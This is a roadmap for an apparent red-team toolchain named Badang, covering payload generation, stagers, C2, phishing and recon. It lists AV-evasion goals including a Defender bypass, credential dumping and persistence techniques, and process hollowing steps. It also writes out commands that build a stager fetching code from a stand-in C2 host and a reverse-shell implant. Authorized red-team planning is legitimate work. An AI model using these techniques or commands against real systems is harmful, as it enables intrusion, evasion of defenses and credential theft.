# Red Team Toolchain Roadmap

Five products cover the entire kill chain. Post-exploitation capabilities (credentials, lateral movement, persistence, exfiltration, tunneling) ship as C2 modules, not standalone tools.

---

## The 5 Products

| # | Product | Kill Chain Stages | Status |
|---|---------|-------------------|--------|
| 1 | **Badang** | Weaponize + Exploit + Install + Evasion | In progress — needs persistence, stager gen, output formats, process hollowing |
| 2 | **Loader/Stager** | Delivery + Exploit | Next |
| 3 | **C2 Framework** | C2 + Actions (creds, lateral, persist, exfil, tunnel as modules) | Planned |
| 4 | **Phishing Toolkit** | Delivery | Planned |
| 5 | **Recon/OSINT** | Reconnaissance | Planned |

---

## Kill Chain Coverage

```
┌──────────────────────────────────────────────────────────────────────┐
│                         RED TEAM KILL CHAIN                          │
│                          5 products, full coverage                    │
├──────────────┬───────────────────────────────────────────────────────┤
│              │                                                       │
│  1. RECON    │  [5] Recon/OSINT                                      │
│              │      Subdomain enum, email harvest, tech fingerprint,  │
│              │      credential breach lookup, org chart mapping       │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  2. WEAPON-  │  [1] Badang                                           │
│     IZE      │      Payload generation (exec, reverse, bind, stager) │
│              │      Payload encryption (XOR/RC4 + PIC stubs)         │
│              │      Output formats (raw, reflective DLL, runner EXE) │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  3. DELIVER  │  [4] Phishing Toolkit                                 │
│              │      Email templates, macro/HTA/LNK/ISO packaging,    │
│              │      tracking pixels, landing page cloner             │
│              │  [2] Loader/Stager                                    │
│              │      HTTPS/DNS/SMB fetch, fileless execution          │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  4. EXPLOIT  │  [2] Loader/Stager                                    │
│              │      Sandbox detection, anti-debug, in-memory exec    │
│              │  [1] Badang                                           │
│              │      ETW patching, AMSI bypass, indirect syscalls     │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  5. INSTALL  │  [1] Badang                                           │
│              │      8 injection techniques (CRT, APC, hijack, early  │
│              │      bird, section map, callback, stomp, hollowing)   │
│              │      Persistence (registry, schtask, WMI, COM, DLL   │
│              │      hijack, service creation)                        │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  6. C2       │  [3] C2 Framework                                     │
│              │      Encrypted comms (HTTPS/DNS/SMB), task queue,     │
│              │      checkin/checkout, operator web UI                 │
│              │      Built-in tunnel module (SOCKS5, DNS, ICMP,       │
│              │      port forward, multi-hop)                         │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  7. ACTIONS  │  [3] C2 Modules:                                      │
│              │      Credentials — LSASS dump, SAM/SYSTEM, Kerberos,  │
│              │                    DPAPI, browser creds               │
│              │      Lateral    — PsExec, WMI, DCOM, WinRM, PtH,     │
│              │                   overpass-the-hash, Kerberoasting    │
│              │      Persist    — registry, schtask, WMI, COM, DLL,  │
│              │                   service (remote deployment)         │
│              │      Exfil      — DNS/HTTPS/cloud, stego, encrypted  │
│              │                   archives, chunked, throttled        │
│              │      Tunnel     — SOCKS5, port forward, DNS/ICMP     │
│              │                   tunnel, reverse SSH, multi-hop      │
│              │                                                       │
├──────────────┼───────────────────────────────────────────────────────┤
│              │                                                       │
│  EVASION     │  [1] Badang — active throughout every stage           │
│  (all        │      XOR string obfuscation (8-byte key)              │
│   stages)    │      Dynamic API resolution (clean IAT)               │
│              │      String sanitization (no flagged keywords)         │
│              │      Indirect syscalls (Hell's Gate / Halo's Gate)    │
│              │      Sleep obfuscation (encrypt memory during sleep)  │
│              │      Stack spoofing (fake call frames)                │
│              │      PE metadata (look like normal application)        │
│              │      Defender static analysis bypass (proven)          │
│              │                                                       │
└──────────────┴───────────────────────────────────────────────────────┘
```

---

## Flow

```
[5] Recon ──► [4] Phishing ──► [2] Stager ──► [1] Badang (evasion)
                                     │
                                     ▼
                               [3] C2 Framework
                                     │
                       ┌──────┬──────┼──────┬──────┐
                       ▼      ▼      ▼      ▼      ▼
                     Creds  Lateral Persist Exfil  Tunnel
                              (C2 post-ex modules)
```

---

## Badang Modifications Required

Badang is the evasion foundation for the entire toolchain. Four additions complete its kill chain coverage:

### 1. Persistence Module (new: `src/persistence/`)

Currently Badang injects into processes but nothing survives a reboot. Adding persistence makes it the single "establish foothold" tool.

| Technique | Method | Detection Difficulty |
|-----------|--------|---------------------|
| Registry Run Keys | `HKCU\...\Run` | Low — well-known, easy to audit |
| Scheduled Task | COM or direct API (`ITaskService`) | Medium |
| WMI Event Subscription | `__EventFilter` + `CommandLineEventConsumer` | High — survives in WMI repository |
| DLL Search Order Hijack | Drop DLL in app directory | High — legitimate path, signed app loads it |
| COM Hijacking | Override CLSID `InprocServer32` | High — rarely audited |
| Service Creation | `CreateServiceW` with auto-start | Medium |

**CLI**: `badang-cli persist --method registry --payload runner.exe -x -c`
**GUI**: New Persist tab with method dropdown, target path, payload path.

### 2. Stager Payload Type (modify: `src/payload/generate.rs`)

Add a `stager` type to the existing shellcode generator. The stager is PIC shellcode that:
1. Resolves WinHTTP APIs via PEB walk (same pattern as existing payloads)
2. Fetches encrypted payload from a URL
3. Decrypts in memory (XOR/RC4, key baked into the stub)
4. Jumps to decrypted payload

```bash
badang-cli generate --type stager --url https://c2.example.com/p.bin --key "s3cret" -o stager.bin
```

This bridges Badang directly to the C2 — no separate stager project needed for simple operations. The standalone Loader/Stager project (product #2) adds sandbox detection, anti-debug, and multi-channel support on top.

### 3. Output Formats (modify: `src/payload/`)

Currently outputs raw `.bin` only. Add packaging for delivery vectors:

| Format | Flag | Use Case |
|--------|------|----------|
| Raw shellcode | `--format raw` | Default, current behavior |
| Reflective DLL | `--format rdll` | DLL sideloading, rundll32 |
| Shellcode Runner EXE | `--format exe` | Standalone dropper with Badang evasion baked in |
| PowerShell cradle | `--format ps1` | One-liner download + execute |
| DLL (export hijack) | `--format dll` | Drop-in for hijackable DLL paths |

```bash
badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --format exe -o implant.exe
```

### 4. Process Hollowing (new: `src/injection/hollowing.rs`)

One injection technique gap. Process hollowing:
1. Create process suspended (`CREATE_SUSPENDED`)
2. Unmap original image (`NtUnmapViewOfSection`)
3. Allocate memory at image base, write payload PE
4. Set entry point in thread context
5. Resume

Useful for the stager — creates a clean, legitimate-looking process to live in. Brings injection count from 7 to 8.

**CLI**: `badang-cli inject --technique hollowing --payload implant.exe -x -c`

---

## Build Order

### Phase 1: Expand Badang (current)

Complete the 4 modifications above. This makes Badang the full weaponize + exploit + install platform.

| Task | Effort | Priority |
|------|--------|----------|
| Persistence module | Medium | High — completes install stage |
| Stager payload type | Small | High — bridges to C2 |
| Process hollowing | Small | Medium — one more technique |
| Output formats | Medium | Medium — bridges to phishing delivery |

### Phase 2: Loader/Stager (product #2)

Standalone binary with capabilities beyond Badang's stager shellcode:
- Multi-channel fetch (HTTPS, DNS over HTTPS, SMB named pipe)
- Sandbox detection (sleep acceleration, process count, disk size, username, domain-joined check)
- Anti-debug (NtQueryInformationProcess, IsDebuggerPresent via PEB, timing checks)
- Anti-VM (CPUID, registry keys, MAC address prefix, WMI queries)
- Staged execution with multiple fallback URLs
- Jitter and beacon interval randomization

### Phase 3: C2 Framework (product #3)

Server + implant architecture:
- **Server**: Rust/Go backend, web UI for operators, listener management (HTTPS/DNS/SMB), task queue, implant tracking
- **Implant**: Generated from Badang's stager template, calls back to server, executes tasked modules
- **Modules** (shipped as loadable BOFs or Rust dylibs):
  - `creds` — LSASS dump (direct syscall + minidump), SAM, Kerberos, DPAPI, browser
  - `lateral` — PsExec, WMI, DCOM, WinRM, PtH, Kerberoast
  - `persist` — remote deployment of Badang persistence techniques
  - `exfil` — staged transfer over DNS/HTTPS/cloud, stego, encrypted archives
  - `tunnel` — SOCKS5, port forward, DNS/ICMP tunnel, multi-hop

### Phase 4: Phishing + Recon (products #4–5)

- **Phishing**: Email campaign engine, template library, payload packager (wraps stager into macro/HTA/LNK/ISO), tracking server, landing page cloner
- **Recon**: Subdomain enumeration (certificate transparency, DNS brute), email harvesting, tech stack fingerprinting (Wappalyzer-style), breach lookup integration

---

## Shared Design Principles

All 5 products follow the patterns established in Badang:

| Principle | Implementation |
|-----------|---------------|
| **Language** | Rust — memory safety, small binaries, no runtime dependency |
| **String obfuscation** | Multi-byte XOR at compile time, decrypt at runtime |
| **API resolution** | Dynamic via GetModuleHandleA + GetProcAddress |
| **IAT hygiene** | Minimal imports — only bootstrap functions visible |
| **String sanitization** | No offensive keywords in compiled binary |
| **PE metadata** | Version info, manifest, icon — look like a normal app |
| **Release profile** | `strip`, `lto`, `opt-level = 3`, `codegen-units = 1`, `panic = abort` |
| **Safety** | Dry-run by default, explicit confirmation for live ops |
| **Dual interface** | CLI for automation, native GUI for interactive use |
| **Cross-compile** | Build Windows binaries from Linux via mingw-w64 |
| **CI/CD** | GitHub Actions — fmt, clippy, test, audit, cross-compile, artifact upload |
| **Defender bypass** | Every binary passes static analysis out of the box |

---

*All tools are for authorized security research and red team operations only.*
